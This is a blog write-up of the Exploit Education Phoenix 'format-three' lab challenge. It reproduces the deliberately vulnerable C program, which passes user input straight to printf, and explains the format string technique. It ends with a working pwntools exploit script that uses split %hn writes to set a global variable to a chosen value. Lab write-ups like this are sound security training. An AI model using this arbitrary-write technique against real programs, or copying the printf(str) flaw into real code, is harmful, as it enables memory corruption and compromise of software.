---
layout: post
title:  "Phoenix Format Three"
date:   2021-02-14 14:00:00 +0000
categories: ExploitEducation
---
# Phoenix Three
## Description:
Challange [Link](https://exploit.education/phoenix/format-three/) (arch: amd64)
```c
/*
 * phoenix/format-three, by https://exploit.education
 *
 * Can you change the "changeme" variable to a precise value?
 *
 * How do you fix a cracked pumpkin? With a pumpkin patch.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[4096];
  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);

  if (changeme == 0x64457845) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    printf(
        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
  }

  exit(0);
}
```

In this challenge, our goal is to change the variable "changeme" to the given value "0x64457845".

## Analyse
1. The first thing is to find the address of our target variable. Run the "GDB", we can get it easily, which is "0x600a90".

2. The "printf" vulnerability is well explained on the internet. Here are some points need to take care:
    1. The format string is located on the previous stack frame, so there is some offset between the current stack position and our format string.
    2. To write a large number as 0x64457845, we need to split on two parts, one is 0x7845 and other is 0x6445.

3. How to compose the payload ? 
    ```
    paddings: n pointers between the target address and the first byte of format string
    offset: n pointers between the current stack pointer to the first byte of format string, choose an arbitrary number.

    offset without last 2 (one manipulate the written number, the other is "%n"): %8x * (offset - 2)  # why 8 ? choose whatever you like :)
    all paddings: %8x * paddings
    target value - current displayed characters' length: %(0x7845 - 8*(paddings + offset-2))x
    write target address: %n
    complete the full paddings: "A" * (8*paddings - len(all before)) # 8*paddings because on amd64 the unit size is 8 byte and "A" = 1 byte
    target address: target address

    final payload = %8x * (offset - 2) + %8x * paddings  + %(0x7845 - 8 * (paddings + offset-2))x + %n +"A" * (8 * paddings - len(all before)) + target address 
    ```

## Solution
1. Here is my solution:
    ```python
    from pwn import *

    changeme = 0x600a90
    target = 0x64457845

    offset = 12
    paddings = 15
    argv = "%8x"*(paddings + offset - 2)
    argv += "%" + str(0x6445 - 8 * (paddings + offset - 2)) + "x"
    argv += "%hn"
    argv += "%" + str(0x7845 - 0x6445) + "x"
    argv += "%hn"
    argv += "A" * (8 * paddings - len(argv))

    argv += p64(changeme + 2)
    argv += "A" * 8
    argv += p64(changeme)

    p = process("/opt/phoenix/amd64/format-three")
    p.send(argv)
    p.interactive()
    ```